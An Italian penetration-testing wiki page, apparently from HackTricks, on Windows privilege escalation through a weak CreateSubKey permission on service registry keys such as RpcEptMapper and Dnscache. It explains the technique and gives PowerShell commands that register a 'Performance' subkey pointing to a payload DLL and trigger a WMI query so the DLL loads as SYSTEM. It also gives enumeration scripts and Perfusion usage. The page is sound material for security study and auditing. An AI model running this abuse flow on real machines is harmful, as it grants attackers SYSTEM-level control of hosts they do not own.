# Permesso AppendData/AddSubdirectory sul Registro dei servizi

{{#include ../../banners/hacktricks-training.md}}

**Il post originale è** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Riepilogo

Se disponi solo dei permessi **`Create Subkey`** / **`AppendData/AddSubdirectory`** su una chiave di registro di un servizio, questa rappresenta comunque una buona opportunità di privesc. Di solito **non puoi** sovrascrivere direttamente `ImagePath`, `ServiceDll` o altri valori esistenti, ma potresti comunque riuscire a creare una chiave figlio **`Performance`** sotto:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Qualsiasi altra chiave **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** in cui il tuo token disponga di **`KEY_CREATE_SUB_KEY`**

Il trucco consiste nel fatto che Windows supporta ancora il modello di registrazione legacy **PerfLib V1**. Se un servizio dispone di una sottochiave **`Performance`**, Windows può caricare una DLL da quella posizione quando un consumer dei performance counter richiede i dati.

Secondo la documentazione Microsoft, la registrazione minima è:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Quindi, la conclusione offensiva è: **non scartare un finding relativo al registry di un service solo perché hai ottenuto soltanto `CreateSubKey` invece di `SetValue`**.<sup>[[3]](#references)</sup>

## Perché questo è sufficiente per l'esecuzione di codice

La subkey `Performance` di solito **non esiste** per default su questi service, quindi **`KEY_CREATE_SUB_KEY`** è la primitive necessaria. Una volta che la key esiste e contiene `Library`/`Open`/`Collect`/`Close`, qualsiasi **performance counter consumer** può attivare il caricamento della DLL.<sup>[[3]](#references)</sup>

Alcuni dettagli importanti:

- Il valore **`Library`** può puntare a un **percorso completo della DLL**.
- La DLL deve esportare **`OpenPerfData`**, **`CollectPerfData`** e **`ClosePerfData`** e restituire `ERROR_SUCCESS`.
- Il codice viene eseguito nel **contesto del consumer**, **non necessariamente nel processo del service vulnerabile**.
- Nel caso classico di `RpcEptMapper` / `Dnscache`, una **query delle performance WMI** può fare in modo che **`wmiprvse.exe`** carichi la DLL come **`NT AUTHORITY\SYSTEM`**.

Per questo è facile non notare la primitive durante il triage: la key del service padre non è "completamente scrivibile", ma può comunque essere weaponized.

## Enumerazione rapida

Verifica manuale a campione con **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Esempio PowerShell per cercare account con privilegi ridotti che dispongono di **`CreateSubKey`** sulle chiavi dei servizi:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Strumenti utili:

- **PrivescCheck**: `Get-ModifiableRegistryPath` è stato creato specificamente per individuare questa classe di problemi.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatizza DLL drop, registrazione di `Performance`, trigger WMI, token duplication e cleanup sui target legacy vulnerabili (ad esempio: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Flusso di abuso

Crea la sottochiave `Performance` e valorizza i valori richiesti:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Quindi attiva un consumer di performance **privilegiato**. Un esempio classico è una query WMI sulle classi `Win32_Perf*`:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Note operative:

- Avviare **`perfmon.exe`** è utile per verificare che la registrazione del contatore sia corretta, ma di solito carica la DLL solo nel **proprio contesto utente**.
- Per una LPE effettiva, attivare un consumer **privilegiato** come **WMI**.
- Se si sta scrivendo un exploit autonomo, avviare direttamente `cmd.exe` dall'interno della DLL di solito lascia una shell nella **sessione 0**. `Perfusion` risolve il problema duplicando il token privilegiato in un processo creato in stato sospeso nella sessione dell'attaccante.<sup>[[4]](#references)</sup>
- Adattare l'architettura della DLL al consumer target (**x64 sui sistemi x64**).

## Note sulle versioni / sviluppi recenti

Storicamente, le chiavi deboli integrate erano:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` e `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` segnala che gli aggiornamenti di **aprile 2021** hanno rimosso il percorso di sfruttamento semplice sui sistemi **Windows 8 / Windows Server 2012** aggiornati, mentre **Windows 7 / Windows Server 2008 R2** sono rimasti sfruttabili tramite **`Dnscache`**.<sup>[[4]](#references)</sup>

Questa primitive **non è solo storica**. A **gennaio 2025**, Microsoft ha corretto un problema correlato in AD DS per cui i membri di **`Network Configuration Operators`** potevano creare subkey sotto **`Dnscache`** e **`NetBT`**; la stessa idea di registrazione di una DLL per i **performance counter** poteva essere riutilizzata per raggiungere **SYSTEM** sui sistemi supportati.<sup>[[2]](#references)</sup>

La lezione moderna è quindi generica: ogni volta che un principal con privilegi ridotti dispone di **`CreateSubKey`** su **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, verificare se è sufficiente una child key **`Performance`** prima di scartare il finding.

## Riferimenti

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
